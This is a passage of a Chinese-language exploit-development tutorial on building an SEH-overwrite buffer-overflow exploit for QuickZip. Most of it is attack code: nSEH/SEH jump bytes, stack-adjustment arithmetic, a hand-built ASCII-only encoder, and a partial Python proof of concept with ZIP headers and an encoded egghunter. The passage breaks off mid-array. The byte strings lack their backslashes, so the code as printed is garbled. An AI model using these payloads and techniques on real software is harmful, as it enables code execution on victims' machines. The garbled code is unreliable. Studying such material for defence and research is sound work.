    "x70x9b"
注意： x9b（-99），因为这是一个不符合要求的字符，所以实际上将转换为 xa2（-92）。
我们的PoC部分应该如下所示：
    payload = egghunter
    payload += "A" * (nseh_offset - len(payload))   # padding for nSEH
    payload += "x71x9bx70x9b"                   # nSEH: jno $-99; jo $-99 ==> 9b will actually be converted to A2, which is $-92
    payload += "x33x28x42x00"                   # SEH
    payload += pattern                              # pattern to look for in memory
    payload += ".txt"
让我们触发崩溃，将执行权传递给程序，单步调试POP-POP-RET指令，观察单步调试JNO / JO指令时会发生什么。
令人惊奇的是，这次跳转到了我们的有效载荷！ 现在，创建自定义编码器，编写指令，跳转到egg hunting例程。
**定制编码器**
为了跳到eghunter，我们需要写许多条指令，因为不使用“坏”字符的话，就没有直接的方法。
要解决这个问题，我们需要执行以下操作：
**找出我们想要写的指令的操作代码**
**使用简单的数学指令（即ADD和SUB），通过允许的字符将来自上述步骤的操作码的值放入我们选择的寄存器（例如EAX）中**
**我们将这个寄存器的值写入堆栈，从而将我们想要的指令写入ESP指向的内存区域**
听起来很复杂？ 但实际上并不是那么糟糕。
首先，我们需要调整堆栈才能写入我们控制的内存区域。
通过观察ESP的值和我们目前的位置（上面的截图），可以发现，我们需要将ESP偏移0x62C（0x0018FB58（EIP的值）减去0x0018F528（ESP的值）再减去0x4（用于填充的空字节））。
这可以通过以下指令来实现：
    push esp;
    pop eax;
    add eax, 0x62C;
    push eax;
    pop esp;
上述指令的相应操作码如下所示：
    "x54"                  # push esp;
    "x58"                  # pop eax;
    "x05x2cx06x00x00"  # add eax, 0x62C
    "x50"                  # push eax;
    "x5c"                  # pop esp;
但是，这里有一个问题—— “ x05 x2c x06 x00 x00”有两个NULL字节，这将破坏我们的漏洞利用代码。
然而，我们可以通过使用有效字符执行几次ADD和SUB指令来设置成我们想要的值，例如，
    x05x2dx07x01x01    # add eax, 0x0101072D
    x2dx01x01x01x01    # sub eax, 0x01010101
                            # total:   0x00000630
瞧！我们可以使用有效的字符来实现同样的事情。下面我们来更新漏洞利用代码，看看会发生什么。
太棒了，我们的有效载荷完全与堆栈可以完美搭配了，下面开始编写我们的编码器。
注意：由于pop esp指令（ x5c）的缘故，ZIP文件的内容看起来会有点不同。
x5c表示一个反斜杠，由QuickZip解释为一个文件夹…这可能在以后有一些影响，但现在没什么。
现在，我们需要做的最后一件事是写一组指令，将egghunter的起始地址放入EAX并跳转到它。
为了避免“坏”字符，我们将在EAX寄存器中设置我们需要的操作码的值，并将其压入我们调整的堆栈上。这样，我们需要的指令将写到我们控制的内存区域中。
下面用一个例子来解释。
让我们从实际想要写的指令开始吧：
    push esp;
    pop eax;
    sub eax, 0xDEADBEEF
    jmp eax;
很简单——将ESP压入堆栈中，将其弹出到EAX中，通过一定的值将其调整到egghunter中（我们不知道确切的值，因此现在的占位符为0xDEADBEEF），并跳转到EAX的调整地址。
下面生成我们需要的字节：
    metasm > push esp
    "x54"
    metasm > pop eax
    "x58"
    metasm > sub eax, 0xDEADBEEF
    "x2dxefxbexadxde"
    metasm > jmp eax
    "xffxe0"
把它们写成4个一组：
    x54x58x2dxef
    xbexadxdexff
    xe0x90x90x90
因为我们一次写4个字节，所以我们需要在末尾填充3个nops（ x90）（把要写入的字节的总长度设为12）。
现在，让我们从右下角开始写字节（因为endianness的缘故）——这将指出我们实际需要压入堆栈的值。
    x90x90x90xe0
    xffxdexadxbe
    xefx2dx58x54
记住，我们只能使用ASCII值，这意味着可以使用几乎任何01到7f字节的组合来进行计算。
让我们用一个对利用代码比较友好的指令，将第一组字节写入eax：
                            # zero out EAX
    "x25x10x10x10x10"  # and eax,0x10101010
    "x25x01x01x01x01"  # and eax,0x01010101
                               # write 0x909090e0 into EAX
    "x05x70x70x70x70"  # add eax, 0x70707070
    "x05x70x20x20x20"  # add eax, 0x20202070
    "x50"                  # push eax;
我们来更新漏洞利用代码并运行它。
太棒了，我们已经在EAX中成功设定了我们需要的值，并把它压入堆栈上，实际上写的是我们需要的指令！
让我们对所有剩余的字节做同样的处理。
完成上述处理后，新的PoC应该如下所示：
    #!/usr/bin/python
    header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
    header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
    "x24x00x00x00x00x00x00x00")
    header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
    "x12x10x00x00x02x10x00x00x00x00")
    print "[+] Building PoC.."
    max_size = 4064
    nseh_offset = 292
    jump_offset = 92
    # msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
    # [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
    egghunter = ("x50x59x49x49x49x49x49x49x49x49x49x49x49x49"
    "x49x49x49x49x37x51x5ax6ax41x58x50x30x41x30"
    "x41x6bx41x41x51x32x41x42x32x42x42x30x42x42"
    "x41x42x58x50x38x41x42x75x4ax49x66x51x49x4b"
    "x52x73x53x63x62x73x36x33x4ex53x6fx30x75x36"